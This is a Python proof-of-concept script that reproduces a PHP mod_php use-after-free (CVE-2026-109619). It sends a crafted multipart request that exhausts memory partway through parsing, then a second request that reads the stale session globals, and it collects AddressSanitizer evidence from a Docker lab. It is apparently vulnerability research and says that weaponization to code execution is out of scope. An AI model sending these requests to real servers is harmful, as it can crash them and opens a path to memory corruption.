#!/usr/bin/env python3
"""
CVE-2026-109619 (GHSA-6wmf-4rv5-p3rp) — mod_php chain reproduction with
ASAN evidence: stale SESSION globals consumed by the upload-progress END
cleanup.

Public writeup (calif.io/php2shell, "The generalized pattern" +
"An interesting timeline"): on mod_php, a fatal during multipart request
startup (before module activation) skips both the MULTIPART_EVENT_END
callback and Session's RSHUTDOWN (php_request_shutdown gates
zend_deactivate_modules on PG(modules_activated)), while Apache still
runs the request shutdown procedure unconditionally. The worker survives
with Session globals still pointing into the freed request heap:

  Request A (armed multipart, single request):
    PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS + a file part ->
      MULTIPART_EVENT_FILE_START -> php_rinit_session(0) +
      PS(id) = copy of the posted SID + php_session_initialize()
      (decodes the session; publishes BG(unserialize) state too).
    Later parts of the SAME request are the CVE-2026-109618 OOM
    producer (empty-filename nested-name expansion, wire far under
    post_max_size) -> the OOM longjmp fires mid-parse ->
      MULTIPART_EVENT_END skipped (PS(id), PS(http_session_vars),
      BG(unserialize) never reset) ->
      request shutdown: modules not activated -> no RSHUTDOWNs ->
      heap freed (tracked allocator) -> Apache worker survives.

  Request B (consumer, NO file part):
    PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS only -> reaches
    MULTIPART_EVENT_END without FILE_START ->
      php_session_rfc1867_cleanup() -> php_session_initialize() ->
      reads the freed PS(id) (ZSTR_VAL(PS(id))[0]) and
      php_session_track_init() destroys the freed session value ->
      heap-use-after-free.

Expected ASAN evidence: read of the freed SID zend_string inside
php_session_initialize (writeup: "read freed Session ID"), and/or the
zval_ptr_dtor over the freed PS(http_session_vars) ("destroy freed
Session value").

Apache prefork runs multiple children; A and B must land on the same
worker, so B is retried until the poisoned child answers.

This lab must be switched to the tracked allocator first:
  lab-asan-modphp/setup-109619.sh   (restores with restore-alloc.sh)

Usage:
  python3 verify_109619_modphp_chain.py --host 127.0.0.1 --port 18082
  raw evidence: docker logs php-asan-modphp-lab 2>&1 | grep -A25 AddressSanitizer

For authorized security testing against your own lab only.
"""
import argparse
import re
import socket
import subprocess
import sys
import time

BOUNDARY = "MODPHPCHAIN"


def http_req(host, port, raw, timeout=300):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(raw)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def build_multipart(parts):
    out = []
    for name, filename, data in parts:
        if filename is None:
            out.append(
                f"--{BOUNDARY}\r\n"
                f'Content-Disposition: form-data; name="{name}"\r\n\r\n{data}\r\n')
        else:
            out.append(
                f"--{BOUNDARY}\r\n"
                f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'
                f"Content-Type: application/octet-stream\r\n\r\n{data}\r\n")
    out.append(f"--{BOUNDARY}--\r\n")
    return "".join(out).encode("latin-1")


def post_multipart(host, port, path, body):
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return http_req(host, port, req)


def expansion_records(count, depth):
    recs = []
    for i in range(count):
        name = f"r{i}" + "[a]" * (depth - 1)
        recs.append((name, "", ""))
    return recs


def docker_logs_since(container, seconds):
    try:
        r = subprocess.run(["docker", "logs", "--since", f"{seconds}s", container],
                           capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr
    except Exception as e:
        return f"<docker logs failed: {e}>"


def worker_evidence(container):
    """mod_php workers' stderr (including AddressSanitizer reports) goes
    to Apache's error log file, not the container's stdout/stderr."""
    try:
        r = subprocess.run(
            ["docker", "exec", container, "cat", "/var/log/apache2/error.log"],
            capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr
    except Exception as e:
        return f"<error log unavailable: {e}>"


def count_asan_reports(blob):
    return blob.count("ERROR: AddressSanitizer")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18082)
    ap.add_argument("--sid", default="abcdef0123456789abcdef0123456789")
    ap.add_argument("--container", default="php-asan-modphp-lab")
    ap.add_argument("--expansion-records", type=int, default=2000,
                    help="CVE-2026-109618 producer records appended to the"
                         " armed request (calibrated for the tracked"
                         " allocator: OOM crosses between ~1000-2000"
                         " records x depth 60 in this build)")
    ap.add_argument("--depth", type=int, default=60)
    ap.add_argument("--consumer-attempts", type=int, default=12,
                    help="prefork has multiple children; retry the consumer"
                         " until it lands on the poisoned worker")
    args = ap.parse_args()

    print("[*] CVE-2026-109619 mod_php chain: stale Session globals consumed")
    print("    by the upload-progress END cleanup")
    print(f"[*] Target: {args.host}:{args.port}  container: {args.container}")
    print()

    # --- mode check: tracked allocator required -------------------------
    print("[0] Allocator mode check (needs 'at file:0' tracked signature).")
    print("    Run lab-asan-modphp/setup-109619.sh first if this shows a")
    print("    zend source location instead.")
    probe = http_req(args.host, args.port, (
        f"GET /oom_probe.php HTTP/1.1\r\nHost: {args.host}\r\n"
        f"Connection: close\r\n\r\n").encode())
    m = re.search(rb"exhausted at ([^ ]+)", probe)
    sig = m.group(1).decode("latin1") if m else "<no OOM probe output>"
    print(f"    OOM signature: {sig}")
    if "file:0" not in sig:
        print("    [!] NOT in tracked-allocator mode — run setup-109619.sh"
              " and retry.")
        sys.exit(1)
    print()

    # --- A0: build the session -----------------------------------------
    print(f"[A0] Building session (SID {args.sid}) via upload progress")
    body = build_multipart([
        ("PHPSESSID", None, args.sid),
        ("PHP_SESSION_UPLOAD_PROGRESS", None, "x"),
        ("f", "seed.bin", "Z"),
    ])
    resp = post_multipart(args.host, args.port, "/index.php", body)
    print("     " + (resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
                    if resp else "<no response>"))
    print()

    # --- A: armed multipart (FILE_START publishes state, then OOM) ------
    parts = [
        ("PHPSESSID", None, args.sid),
        ("PHP_SESSION_UPLOAD_PROGRESS", None, "x"),
        ("f", "a.bin", "Z"),
    ] + expansion_records(args.expansion_records, args.depth)
    body = build_multipart(parts)
    print(f"[A] Armed multipart: file part (FILE_START publishes Session")
    print(f"    state) + {args.expansion_records} empty-filename expansion"
          f" records x depth {args.depth} (the CVE-2026-109618 OOM")
    print(f"    producer; wire {len(body)} bytes, far under post_max_size)")
    t0 = time.time()
    resp = post_multipart(args.host, args.port, "/index.php", body)
    dt = time.time() - t0
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") \
        if resp else "<no response>"
    print(f"    response: {status}  ({dt:.1f}s)")
    text = resp.decode("latin1", "replace") if resp else ""
    for line in text.splitlines():
        if "Allowed memory size" in line:
            print(f"    [EVIDENCE] {line.strip()[:200]}")
            break
    print()

    # The shutdown over the half-initialized state may itself produce ASAN
    # reports ("the SAPI determines whether the partial Bucket is ever
    # consumed") — capture them too.
    time.sleep(2)
    blob = worker_evidence(args.container)
    reports = count_asan_reports(blob)
    print(f"    ASAN reports so far (worker stderr -> apache error log):"
          f" {reports}")
    if reports:
        for line in blob.splitlines():
            if "ERROR: AddressSanitizer" in line:
                print(f"    [EVIDENCE] {line.strip()[:170]}")
                break

    # --- B: consumer — END cleanup reads freed PS(id) ------------------
    print()
    print("[B] Consumer: multipart with SID + PHP_SESSION_UPLOAD_PROGRESS,")
    print("    NO file part -> MULTIPART_EVENT_END -> rfc1867 cleanup ->")
    print("    php_session_initialize() reads the freed PS(id) / destroys")
    print("    the freed session value. Retrying against prefork children"
          " until")
    print("    the poisoned worker answers...")
    body = build_multipart([
        ("PHPSESSID", None, args.sid),
        ("PHP_SESSION_UPLOAD_PROGRESS", None, "x"),
    ])
    found = None
    for attempt in range(1, args.consumer_attempts + 1):
        before = count_asan_reports(worker_evidence(args.container))
        resp = post_multipart(args.host, args.port, "/index.php", body)
        time.sleep(2)
        blob = worker_evidence(args.container)
        after = count_asan_reports(blob)
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") \
            if resp else "<no response>"
        print(f"    attempt {attempt:2d}: {status}   "
              f"cumulative ASAN reports: {after}")
        if after > before:
            found = blob
            break
        # re-arm: the poisoned worker may need the producer again if this
        # attempt hit a clean child and we run low on attempts
        if attempt == args.consumer_attempts // 2:
            print("    [note] re-arming the poisoned worker pool with"
                  " another producer pass")
            body_a = build_multipart([
                ("PHPSESSID", None, args.sid),
                ("PHP_SESSION_UPLOAD_PROGRESS", None, "x"),
                ("f", "a.bin", "Z"),
            ] + expansion_records(args.expansion_records, args.depth))
            post_multipart(args.host, args.port, "/index.php", body_a)
            body = build_multipart([
                ("PHPSESSID", None, args.sid),
                ("PHP_SESSION_UPLOAD_PROGRESS", None, "x"),
            ])

    print()
    if found:
        print("[EVIDENCE] CVE-2026-109619 mod_php chain REPRODUCED —")
        print("    AddressSanitizer report(s) from the consumer request:")
        lines = found.splitlines()
        printing = False
        shown = 0
        for line in lines:
            if "ERROR: AddressSanitizer" in line:
                printing = True
            if printing:
                print(f"      {line[:170]}")
                shown += 1
                if shown > 32:
                    break
        print()
        fl = found.lower()
        for marker, desc in (
                ("ps_id", "PS(id)"),
                ("zend_string", "freed SID zend_string"),
                ("php_session_initialize", "php_session_initialize (END cleanup)"),
                ("php_session_track_init", "php_session_track_init (freed value dtor)"),
                ("rfc1867", "rfc1867 callback path")):
            if marker in fl:
                print(f"    [x] stack contains: {desc}")
    else:
        print("[*] No ASAN report from the consumer attempts — the poisoned")
        print("    child may not have answered (prefork scheduling), or the")
        print("    armed request did not leave the expected state. Check:")
        print(f"    docker exec {args.container} cat /var/log/apache2/error.log"
              f" | grep -B2 -A25 AddressSanitizer")
        print("    and increase --consumer-attempts.")
    print()
    print("[*] Chain mapping (writeup -> this lab):")
    print("    A producer = upload-progress FILE_START publishes request-owned")
    print("                 Session state DURING multipart startup; the OOM")
    print("                 producer (CVE-2026-109618) fatals the parse")
    print("                 before MULTIPART_EVENT_END / RSHUTDOWN run.")
    print("    B consumer = multipart without a file part -> END cleanup ->")
    print("                 php_session_initialize() on stale PS(id) / stale")
    print("                 http_session_vars — the writeup's")
    print("                 'read freed Session ID / destroy freed Session")
    print("                 value' path.")
    print("[*] Honest ceiling: stale-state CONSUMPTION is the reproduced")
    print("    part; weaponized corruption->RCE (heap grooming, slab-bin")
    print("    fake structures, build-specific offsets) is out of scope.")


if __name__ == "__main__":
    main()